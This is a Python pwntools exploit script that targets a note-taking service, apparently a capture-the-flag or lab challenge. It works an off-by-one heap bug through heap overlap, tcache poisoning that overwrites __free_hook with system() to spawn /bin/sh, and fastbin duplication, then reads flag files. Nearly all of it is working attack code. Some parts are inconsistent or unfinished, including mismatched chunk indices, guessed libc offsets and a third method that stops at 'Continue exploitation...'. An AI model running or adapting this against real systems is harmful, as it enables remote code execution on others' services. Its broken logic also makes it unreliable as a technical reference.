#!/usr/bin/env python3
"""
Advanced Note-Taking Service Exploit
Handles off-by-one with multiple exploitation paths
"""

from pwn import *
import sys

context.log_level = 'info'
context.arch = 'amd64'

class NoteExploit:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.io = None
        self.leaked = {}
        
    def connect(self):
        """Establish connection"""
        self.io = remote(self.host, self.port)
        print(f"[+] Connected to {self.host}:{self.port}")
        
    def parse_leaks(self):
        """Parse leaked addresses from startup"""
        print("[*] Parsing leaked addresses...")
        try:
            banner = self.io.recvuntil(b'>', timeout=3)
            print(banner.decode(errors='ignore'))
            
            # Look for hex addresses
            import re
            hex_pattern = rb'0x[0-9a-fA-F]+'
            addresses = re.findall(hex_pattern, banner)
            
            for i, addr_bytes in enumerate(addresses):
                addr = int(addr_bytes, 16)
                print(f"[*] Address {i}: 0x{addr:016x}")
                
                # Try to identify what this address is
                if addr & 0xfff == 0:  # Page aligned, likely base
                    if addr > 0x7f0000000000:  # Typical libc range
                        self.leaked['libc_base'] = addr
                        print(f"[+] Likely libc base: 0x{addr:016x}")
                    elif addr > 0x555555554000 and addr < 0x555555600000:
                        self.leaked['pie_base'] = addr
                        print(f"[+] Likely PIE base: 0x{addr:016x}")
                elif addr > 0x7ffffffd0000:  # Stack range
                    self.leaked['stack'] = addr
                    print(f"[+] Stack leak: 0x{addr:016x}")
                else:
                    self.leaked[f'addr_{i}'] = addr
                    
        except Exception as e:
            print(f"[!] Error parsing leaks: {e}")
            
    def menu(self, choice):
        """Send menu choice"""
        self.io.sendlineafter(b'>', str(choice).encode())
        
    def create(self, size, content):
        """Create note"""
        self.menu(1)
        self.io.sendlineafter(b':', str(size).encode())
        self.io.sendlineafter(b':', content)
        
    def edit(self, idx, content):
        """Edit note - vulnerable to off-by-one"""
        self.menu(2)
        self.io.sendlineafter(b':', str(idx).encode())
        self.io.sendlineafter(b':', content)
        
    def delete(self, idx):
        """Delete note"""
        self.menu(3)
        self.io.sendlineafter(b':', str(idx).encode())
        
    def show(self, idx):
        """Show note"""
        self.menu(4)
        self.io.sendlineafter(b':', str(idx).encode())
        return self.io.recvuntil(b'>', timeout=1)
        
    def exploit_method_1_heap_overlap(self):
        """
        Method 1: Heap overlap via off-by-one
        - Create chunks in specific layout
        - Use off-by-one to corrupt next chunk size
        - Free corrupted chunk to consolidate
        - Reallocate to create overlap
        - Overwrite fd/bk pointers or function pointers
        """
        print("\n[*] Method 1: Heap Overlap Attack")
        
        # Allocate chunks
        self.create(0x88, b'A' * 0x80)  # idx 0
        self.create(0x88, b'B' * 0x80)  # idx 1 - victim
        self.create(0x88, b'C' * 0x80)  # idx 2 - prevent consolidation
        
        # Off-by-one: overwrite size of chunk 1
        # Size field is at offset 0x88 from chunk 0 data
        payload = b'A' * 0x88 + b'\x91'  # Set size to 0x91 (includes prev_inuse)
        self.edit(0, payload)
        
        # Free chunk 1 with corrupted size
        self.delete(1)
        
        # Allocate smaller chunk - creates overlap
        self.create(0x48, b'D' * 0x40)  # idx 1 (reused)
        
        # Now chunks overlap - we can overwrite chunk 2 metadata via chunk 1
        print("[+] Created overlapping chunks")
        
        # Try to leak libc by reading freed chunk
        try:
            leak = self.show(2)
            if len(leak) > 8:
                leaked_addr = u64(leak[:8].ljust(8, b'\x00'))
                print(f"[*] Leaked address: 0x{leaked_addr:016x}")
                if leaked_addr > 0x7f0000000000:
                    self.leaked['libc_leak'] = leaked_addr
        except:
            pass
            
    def exploit_method_2_tcache_poison(self):
        """
        Method 2: Tcache poisoning
        - Fill tcache with chunks
        - Use off-by-one to corrupt tcache next pointer
        - Allocate to arbitrary write
        """
        print("\n[*] Method 2: Tcache Poisoning")
        
        # Fill tcache (7 chunks for same size)
        for i in range(7):
            self.create(0x88, b'X' * 0x80)
            
        # Create victim and target
        self.create(0x88, b'Y' * 0x80)  # victim
        self.create(0x88, b'Z' * 0x80)  # target
        
        # Free them to populate tcache
        for i in range(7):
            self.delete(i)
            
        # Off-by-one to corrupt tcache next pointer
        # Point it to __free_hook or __malloc_hook
        if 'libc_base' in self.leaked:
            libc = self.leaked['libc_base']
            free_hook = libc + 0x1eee48  # Offset may vary
            
            payload = b'A' * 0x88 + p64(free_hook)
            self.edit(7, payload)
            
            # Allocate twice to get chunk at free_hook
            self.create(0x88, b'B' * 0x80)
            self.create(0x88, p64(libc + 0x50d60))  # system()
            
            # Trigger free with "/bin/sh"
            self.create(0x20, b'/bin/sh\x00')
            self.delete(10)  # Calls system("/bin/sh")
            
    def exploit_method_3_fastbin_dup(self):
        """
        Method 3: Fastbin duplication
        - Create fastbin chunks
        - Use off-by-one to bypass double-free check
        - Duplicate chunk in fastbin
        - Arbitrary write
        """
        print("\n[*] Method 3: Fastbin Duplication")
        
        # Allocate fastbin-sized chunks (< 0x80)
        self.create(0x68, b'A' * 0x60)  # idx 0
        self.create(0x68, b'B' * 0x60)  # idx 1
        self.create(0x68, b'C' * 0x60)  # idx 2
        
        # Free to populate fastbin
        self.delete(0)
        self.delete(1)
        
        # Off-by-one to corrupt fd pointer
        payload = b'D' * 0x68 + b'\x71'  # Maintain size
        self.edit(2, payload)
        
        # Continue exploitation...
        
    def get_shell(self):
        """Attempt to get interactive shell"""
        print("\n[*] Attempting to spawn shell...")
        try:
            self.io.sendline(b'id')
            response = self.io.recvline(timeout=2)
            if b'uid=' in response:
                print("[+] Shell obtained!")
                print(response.decode())
                
                # Get flag
                self.io.sendline(b'ls -la')
                print(self.io.recvuntil(b'$', timeout=2).decode())
                
                self.io.sendline(b'cat flag.txt')
                flag = self.io.recvline(timeout=2)
                print(f"\n[+] FLAG: {flag.decode().strip()}")
                
                self.io.sendline(b'cat flag')
                flag2 = self.io.recvline(timeout=2)
                print(f"[+] FLAG: {flag2.decode().strip()}")
                
                return True
        except:
            pass
            
        # If direct shell doesn't work, try interactive
        print("[*] Dropping to interactive mode...")
        self.io.interactive()
        return False
        
    def run(self):
        """Main exploitation routine"""
        try:
            self.connect()
            self.parse_leaks()
            
            # Try different exploitation methods
            try:
                self.exploit_method_1_heap_overlap()
            except Exception as e:
                print(f"[!] Method 1 failed: {e}")
                
            # Get shell
            self.get_shell()
            
        except Exception as e:
            print(f"[!] Exploitation failed: {e}")
            import traceback
            traceback.print_exc()
        finally:
            if self.io:
                self.io.close()

def main():
    if len(sys.argv) < 3:
        print("Usage: python pwn_note_service.py <host> <port>")
        print("\nWaiting for lab connection details...")
        print("Once you have them, run:")
        print("  python pwn_note_service.py <host> <port>")
        sys.exit(1)
        
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    exploit = NoteExploit(host, port)
    exploit.run()

if __name__ == '__main__':
    main()
